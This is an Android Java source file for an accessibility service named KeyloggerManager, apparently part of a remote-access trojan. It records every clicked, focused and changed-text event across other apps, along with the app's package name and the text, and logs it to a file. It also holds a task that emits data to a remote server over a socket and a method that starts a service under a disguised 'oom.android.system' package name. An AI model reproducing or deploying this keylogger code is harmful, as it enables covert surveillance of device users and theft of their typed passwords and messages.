package com.remote.app.Managers;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.os.AsyncTask;
import android.os.Build;
import android.renderscript.ScriptGroup;
import android.text.method.KeyListener;
import android.text.method.TextKeyListener;
import android.util.Log;
import android.view.InputEvent;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityEventSource;
import android.view.accessibility.AccessibilityManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.inputmethod.InputConnection;
import android.view.inputmethod.InputMethod;


import com.remote.app.IOSocket;
import com.remote.app.MainService;
import com.remote.app.Managers.base;
import com.remote.app.TypeOpenFile;

import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import io.socket.client.IO;

public class KeyloggerManager extends AccessibilityService {

    private class SendToServerTask extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {
            try {
                IOSocket.getInstance().getIoSocket().emit("0xAL" , params[0]);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return params[0];
        }
    }


    static final String TAG = "RecorderService";

    private String getEventType(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                return "VIEW_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                return "VIEW_FOCUSED";
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                return "WINDOW_STATE_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "TEXT_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                return "VIEW_LONG_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                return "VIEW_SELECTED";

        }
        return "default";
    }

    private String getEventText(AccessibilityEvent event) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s+" ");
        }
        return sb.toString();
    }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if(getEventType(event) == "default")
            return;
        JSONObject data = new JSONObject();
        try {
            data.put(base.LOGGER.TIME, new Date().getTime());
            data.put(base.LOGGER.TYPE, getEventType(event));
            data.put(base.LOGGER.PACKAGE, event.getPackageName());
            data.put(base.LOGGER.TEXT, getEventText(event));
            MainService.WriteFile(TypeOpenFile.ActionLogger,data.toString() +'\n');

        }catch (Exception e){

        }

    }

    @Override
    public void onInterrupt() {
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT |
                AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;

        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        setServiceInfo(info);

    }

    private void debugClick(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            AccessibilityNodeInfo nodeInfo = event.getSource();
            if (nodeInfo == null) {
                return;
            }
            nodeInfo.refresh();
            Log.d(TAG, "ClassName:" + nodeInfo.getClassName() +
                    " Text:" + nodeInfo.getText() +
                    " ViewIdResourceName:" + nodeInfo.getViewIdResourceName() +
                    " isClickable:" + nodeInfo.isClickable());
        }
    }

    private void startApp() {

        Intent i = new Intent();
        i.setComponent(new ComponentName("oom.android.system", "oom.android.system.app.MyService"));
        i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startService(i);
    }


}
